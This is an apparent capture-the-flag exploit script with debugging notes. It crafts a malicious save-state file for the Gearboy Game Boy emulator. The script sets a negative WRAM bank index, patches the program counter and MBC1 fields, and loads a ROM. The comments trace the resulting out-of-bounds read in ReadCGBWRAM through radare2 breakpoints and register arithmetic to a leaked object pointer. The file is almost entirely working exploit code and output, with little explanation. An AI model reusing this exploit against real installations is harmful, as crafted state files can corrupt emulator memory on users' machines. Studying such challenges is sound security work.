#!/usr/bin/env python3

import os
import shutil
import struct

rom_name = "pwn.gb"
src_name = "pwn.orig.state"
dst_name = "pwn.state"

os.remove(dst_name)
shutil.copy(src_name, dst_name)
os.chmod(dst_name, 0o0644)

with open(dst_name, 'r+b') as f:
    # Patch ROM
    f.seek(0, 0)
    with open(rom_name, "rb") as rom:
        f.write(rom.read(0x10000))

    # Memory::m_iCurrentWRAMBank
    f.seek(0x10000, 0)
    f.write(struct.pack("<i", -0x7b))
    # f.write(struct.pack("<i", -0x13)) # +0x960 => Processor::OPCode0x00

    # Processor::PC
    f.seek(0x1a020, 0)
    f.write(struct.pack("<h", 0x200))

    # MBC1MemoryRule::m_bRamEnabled
    f.seek(253585, 0)
    f.write(b'\x01')

    # MBC1MemoryRule::m_iMode
    f.seek(253573, 0)
    f.write(struct.pack("<i", 1))

    # MBC1MemoryRule::iCurrentRAMBank
    #f.seek(253577, 0)
    #f.write(struct.pack("<i", -99999999))

# Deploy:
# lima docker cp /Users/richard/cscg-2022/gearboy/pwn.state 3f515bf737b3:/home/ctf/gearboy/platforms/linux/


# [0x7fa484c75100]> db @ sym.application_mainloop__ + 0x13ba
# [0x7fa484c75100]> pd 1 @ sym.application_mainloop__ + 0x13ba
#             0x55e4d1e65a7a      ffd0           call rax
# [0x7fa484c75100]> db @@ sym.Processor::OPCode0x*

# [0x7f20ba3ec100]> db (sym.application_mainloop__+0x13ba)
# [0x7f20ba3ec100]> db
# 0x55feaaa3fa7a - 0x55feaaa3fa7b 1 --x sw break enabled valid cmd="" cond="" name="(sym.application_mainloop__+0x13ba)" module="/home/ctf/gearboy/platforms/linux/gearboy.orig"

# LD A, ($D960)
# -> call rax
# -> Processor::OPCode0xFA
#    -> Memory::Read(unsigned short)
#        -> RomOnlyMemoryRule::PerformRead(unsigned short)
#    -> Memory::Read(unsigned short)
#        -> RomOnlyMemoryRule::PerformRead(unsigned short)
#    -> Memory::Read(unsigned short)
#        -> RomOnlyMemoryRule::PerformRead(unsigned short)


# db (sym.Memory::Read_unsigned_short_+0x494)
# at ReadCGBWRAM (vulnerable read primitive)
# m_pWRAMBanks[(address - 0xD000) + (0x1000 * m_iCurrentWRAMBank)]


# mov eax, dword [rdx + 0x7c]
# ~ rax=0xffffffed (-19)

# shl eax, 0xc
# ~ rax=0xfffed000 (-77824)

# ~ rbp=0x0000d960
# lea eax, [rax + rbp - 0xd000]
# ~ rax=0xfffed960

# cqde
# ~ rax=0xffffffffffffed960

# ~ rcx=0x55cd12e2e500
# movzx eax, byte [rcx + rax]
# LFG!!!!!!!!!!!!!!!!!!!!!!!!!!

# rcx + rax => 20 e4 78 11 cd 55 00 00 ;~> Processor
